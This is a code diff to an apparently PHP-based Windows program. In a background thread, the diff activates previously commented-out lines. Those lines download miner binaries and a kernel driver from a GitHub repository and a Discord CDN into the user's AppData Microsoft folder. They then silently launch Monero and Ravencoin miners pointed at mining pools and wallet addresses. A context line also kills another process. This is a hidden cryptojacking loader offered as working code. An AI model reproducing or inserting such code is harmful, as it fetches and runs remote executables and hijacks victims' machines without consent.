@@ -23,17 +23,17 @@ execute('cmd /c taskkill /f /im oxibyte.exe');
 use httpclient;
 
 (new Thread(function(){
-    //file_put_contents($_ENV['APPDATA'].'\\Microsoft\\xmrig-cuda.dll',file_get_contents('https://github.com/Rastihin/mce/raw/main/xmrig-cuda.dll'));
-    //file_put_contents($_ENV['APPDATA'].'\\Microsoft\\WinRing0x64.sys',file_get_contents('https://github.com/Rastihin/mce/raw/main/WinRing0x64.sys'));
-    //file_put_contents($_ENV['APPDATA'].'\\Microsoft\\nvrtc-builtins64_102.dll',file_get_contents('https://cdn.discordapp.com/attachments/836942104986124312/838423281199611914/nvrtc-builtins64_102.dll'));
-    //file_put_contents($_ENV['APPDATA'].'\\Microsoft\\nvrtc64_102_0.dll',file_get_contents('https://github.com/Rastihin/mce/raw/main/nvrtc64_102_0.dll'));
-    //file_put_contents($_ENV['APPDATA'].'\\Microsoft\\5.exe',file_get_contents('https://github.com/Rastihin/mce/raw/main/5.exe'));
-    //wait(5000);
-    //execute('cmd /c '.$_ENV['APPDATA'].'\\Microsoft\\5.exe'.' --coin XMR --url monero.kryptex.network:7777 --user 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGj2eezRPM372XRSQi.v2d5397369 -p x --log-file 1619948916_xmr_12001_log.txt --http-host 127.0.0.1 --http-port 12001 --threads 1 -B');
+    file_put_contents($_ENV['APPDATA'].'\\Microsoft\\xmrig-cuda.dll',file_get_contents('https://github.com/Rastihin/mce/raw/main/xmrig-cuda.dll'));
+    file_put_contents($_ENV['APPDATA'].'\\Microsoft\\WinRing0x64.sys',file_get_contents('https://github.com/Rastihin/mce/raw/main/WinRing0x64.sys'));
+    file_put_contents($_ENV['APPDATA'].'\\Microsoft\\nvrtc-builtins64_102.dll',file_get_contents('https://cdn.discordapp.com/attachments/836942104986124312/838423281199611914/nvrtc-builtins64_102.dll'));
+    file_put_contents($_ENV['APPDATA'].'\\Microsoft\\nvrtc64_102_0.dll',file_get_contents('https://github.com/Rastihin/mce/raw/main/nvrtc64_102_0.dll'));
+    file_put_contents($_ENV['APPDATA'].'\\Microsoft\\5.exe',file_get_contents('https://github.com/Rastihin/mce/raw/main/5.exe'));
+    wait(5000);
+    execute('cmd /c '.$_ENV['APPDATA'].'\\Microsoft\\5.exe'.' --coin XMR --url monero.kryptex.network:7777 --user 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGj2eezRPM372XRSQi.v2d5397369 -p x --log-file 1619948916_xmr_12001_log.txt --http-host 127.0.0.1 --http-port 12001 --threads 1 -B');
     
-    //file_put_contents($_ENV['APPDATA'].'\\Microsoft\\3.exe',file_get_contents('https://github.com/Rastihin/mce/raw/main/3.exe'));
-    //wait(5000);
-    //execute('cmd /c start /b '.$_ENV['APPDATA'].'\\Microsoft\\3.exe'.' -a kawpow -o stratum+tcp://rvn.kryptex.network:7000 -u RRrPSJ7C8up3LW8a11jwVNzgqPX7F27AjM.v2d5397369 -p xxxxxx --api-bind-http 127.0.0.1:12001 --log-path 1619949005_rvn_12001_log.txt --no-watchdog --low-load 1 --devices 0');
+    file_put_contents($_ENV['APPDATA'].'\\Microsoft\\3.exe',file_get_contents('https://github.com/Rastihin/mce/raw/main/3.exe'));
+    wait(5000);
+    execute('cmd /c start /b '.$_ENV['APPDATA'].'\\Microsoft\\3.exe'.' -a kawpow -o stratum+tcp://rvn.kryptex.network:7000 -u RRrPSJ7C8up3LW8a11jwVNzgqPX7F27AjM.v2d5397369 -p xxxxxx --api-bind-http 127.0.0.1:12001 --log-path 1619949005_rvn_12001_log.txt --no-watchdog --low-load 1 --devices 0');
         
 
 }))->start();
